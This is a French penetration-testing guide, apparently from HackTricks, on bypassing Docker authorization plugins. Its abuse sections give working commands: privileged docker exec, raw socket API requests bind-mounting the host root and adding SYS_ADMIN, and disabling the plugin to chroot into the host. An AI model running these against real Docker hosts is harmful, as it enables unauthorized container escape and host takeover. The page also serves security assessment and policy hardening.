# Plugins d'autorisation à l'exécution

{{#include ../../../banners/hacktricks-training.md}}

## Aperçu

Les plugins d'autorisation à l'exécution constituent une couche de politique supplémentaire qui décide si un appelant peut effectuer une action donnée du daemon. Docker est l'exemple classique. Par défaut, toute personne pouvant communiquer avec le Docker daemon dispose effectivement d'un large contrôle sur celui-ci. Les plugins d'autorisation tentent de restreindre ce modèle en examinant l'utilisateur authentifié et l'opération API demandée, puis en autorisant ou en refusant la requête selon la politique.

Ce sujet mérite sa propre page parce qu'il change le modèle d'exploitation lorsqu'un attaquant a déjà accès à une API Docker ou à un utilisateur du groupe `docker`. Dans de tels environnements, la question n'est plus seulement « can I reach the daemon? » mais aussi « is the daemon fenced by an authorization layer, and if so, can that layer be bypassed through unhandled endpoints, weak JSON parsing, or plugin-management permissions? »

## Fonctionnement

Lorsqu'une requête atteint le Docker daemon, le sous-système d'autorisation peut transmettre le contexte de la requête à un ou plusieurs plugins installés. Le plugin voit l'identité de l'utilisateur authentifié, les détails de la requête, certains headers sélectionnés, et des parties du corps de la requête ou de la réponse lorsque le type de contenu est adapté. Plusieurs plugins peuvent être enchaînés, et l'accès n'est accordé que si tous les plugins autorisent la requête.

Ce modèle paraît robuste, mais sa sécurité dépend entièrement de la compréhension complète de l'API par l'auteur de la politique. Un plugin qui bloque `docker run --privileged` mais ignore `docker exec`, omet des clés JSON alternatives telles que le top-level `Binds`, ou permet l'administration des plugins peut créer une fausse impression de restriction tout en laissant des chemins directs de privilege-escalation ouverts.

## Cibles courantes des plugins

Les domaines importants à examiner dans la politique sont :

- container creation endpoints
- `HostConfig` fields such as `Binds`, `Mounts`, `Privileged`, `CapAdd`, `PidMode`, and namespace-sharing options
- `docker exec` behavior
- plugin management endpoints
- any endpoint that can indirectly trigger runtime actions outside the intended policy model

Historiquement, des exemples tels que le plugin `authz` de Twistlock et des plugins éducatifs simples comme `authobot` ont rendu ce modèle facile à étudier parce que leurs fichiers de politique et leurs chemins de code montraient comment le mapping endpoint-to-action était réellement implémenté. Pour les travaux d'évaluation, la leçon importante est que l'auteur de la politique doit comprendre la surface complète de l'API plutôt que seulement les commandes CLI les plus visibles.

## Abus

Le premier objectif est de déterminer ce qui est réellement bloqué. Si le daemon refuse une action, l'erreur often leaks le nom du plugin, ce qui permet d'identifier le contrôle en place :
```bash
docker ps
docker run --rm -it --privileged ubuntu:24.04 bash
docker plugin ls
```
Si vous avez besoin d'un profilage plus large des endpoints, des outils tels que `docker_auth_profiler` sont utiles car ils automatisent la tâche autrement répétitive de vérifier quelles routes d'API et quelles structures JSON sont réellement autorisées par le plugin.

Si l'environnement utilise un plugin personnalisé et que vous pouvez interagir avec l'API, énumérez quels champs d'objet sont réellement filtrés :
```bash
docker version
docker inspect <container> 2>/dev/null | head
curl --unix-socket /var/run/docker.sock http:/version
curl --unix-socket /var/run/docker.sock http:/v1.41/containers/json
```
Ces contrôles sont importants car de nombreuses défaillances d'autorisation sont spécifiques à des champs plutôt que spécifiques à des concepts. Un plugin peut rejeter un motif CLI sans bloquer complètement la structure API équivalente.

### Exemple complet : `docker exec` ajoute des privilèges après la création du conteneur

Une politique qui bloque la création de conteneurs privilégiés mais autorise la création de conteneurs non confinés et `docker exec` peut néanmoins être contournée :
```bash
docker run -d --security-opt seccomp=unconfined --security-opt apparmor=unconfined ubuntu:24.04 sleep infinity
docker ps
docker exec -it --privileged <container_id> bash
```
Si le daemon accepte la deuxième étape, l'utilisateur a récupéré un processus interactif privilégié à l'intérieur d'un container que l'auteur de la politique croyait contraint.

### Exemple complet : Bind Mount Through Raw API

Certaines politiques défaillantes n'inspectent qu'une seule structure JSON. Si le root filesystem bind mount n'est pas bloqué de manière cohérente, l'hôte peut quand même être monté:
```bash
docker version
curl --unix-socket /var/run/docker.sock \
-H "Content-Type: application/json" \
-d '{"Image":"ubuntu:24.04","Binds":["/:/host"]}' \
http:/v1.41/containers/create
docker start <container_id>
docker exec -it <container_id> chroot /host /bin/bash
```
La même idée peut aussi apparaître sous `HostConfig`:
```bash
curl --unix-socket /var/run/docker.sock \
-H "Content-Type: application/json" \
-d '{"Image":"ubuntu:24.04","HostConfig":{"Binds":["/:/host"]}}' \
http:/v1.41/containers/create
```
L'impact est un full host filesystem escape. Le détail intéressant est que le bypass provient d'une couverture de politique incomplète plutôt que d'un kernel bug.

### Exemple complet : attribut Capability non vérifié

Si la politique oublie de filtrer un attribut lié à la capability, l'attaquant peut créer un container qui récupère une capability dangereuse :
```bash
curl --unix-socket /var/run/docker.sock \
-H "Content-Type: application/json" \
-d '{"Image":"ubuntu:24.04","HostConfig":{"CapAdd":["SYS_ADMIN"]}}' \
http:/v1.41/containers/create
docker start <container_id>
docker exec -it <container_id> bash
capsh --print
```
Une fois que `CAP_SYS_ADMIN` ou une capacité d'une puissance similaire est présente, de nombreuses breakout techniques décrites dans [capabilities.md](protections/capabilities.md) et [privileged-containers.md](privileged-containers.md) deviennent accessibles.

### Exemple complet : Désactiver le plugin

Si les opérations de plugin-management sont autorisées, le bypass le plus propre peut être de désactiver complètement le contrôle :
```bash
docker plugin ls
docker plugin disable <plugin_name>
docker run --rm -it --privileged -v /:/host ubuntu:24.04 chroot /host /bin/bash
docker plugin enable <plugin_name>
```
Il s'agit d'une défaillance de politique au niveau du plan de contrôle. La couche d'autorisation existe, mais l'utilisateur qu'elle était censée restreindre conserve toujours l'autorisation de la désactiver.

## Vérifications

Ces commandes visent à identifier si une couche de politique existe et si elle semble complète ou superficielle.
```bash
docker plugin ls
docker info 2>/dev/null | grep -i authorization
docker run --rm -it --privileged ubuntu:24.04 bash
curl --unix-socket /var/run/docker.sock http:/v1.41/plugins 2>/dev/null
```
Ce qui est intéressant ici :

- Les messages de refus qui incluent le nom d'un plugin confirment l'existence d'une couche d'autorisation et révèlent souvent l'implémentation exacte.
- La liste des plugins visible par un attaquant peut suffire à déterminer si des opérations de désactivation ou de reconfiguration sont possibles.
- Une politique qui bloque uniquement les actions CLI évidentes mais pas les requêtes API brutes doit être considérée comme contournable tant que le contraire n'est pas démontré.

## Valeurs par défaut du runtime

| Runtime / plateforme | État par défaut | Comportement par défaut | Affaiblissements manuels courants |
| --- | --- | --- | --- |
| Docker Engine | Not enabled by default | L'accès au daemon est en pratique tout-ou-rien à moins qu'un plugin d'autorisation ne soit configuré | politique de plugin incomplète, listes noires au lieu de listes d'autorisation, autoriser la gestion des plugins, angles morts au niveau des champs |
| Podman | Not a common direct equivalent | Podman repose généralement davantage sur les permissions Unix, l'exécution sans root et les décisions d'exposition de l'API que sur les plugins d'autorisation de type Docker | exposition large d'une API Podman en root, permissions faibles du socket |
| containerd / CRI-O | Different control model | Ces runtimes s'appuient généralement sur les permissions du socket, les frontières de confiance du nœud et les contrôles d'orchestrateur de couche supérieure plutôt que sur les plugins d'autorisation Docker | montage du socket dans des workloads, hypothèses de confiance locales au nœud faibles |
| Kubernetes | Uses authn/authz at the API-server and kubelet layers, not Docker authz plugins | Le RBAC du cluster et les contrôles d'admission sont la principale couche de politique | RBAC trop large, politique d'admission faible, exposition directe du kubelet ou des API runtime |
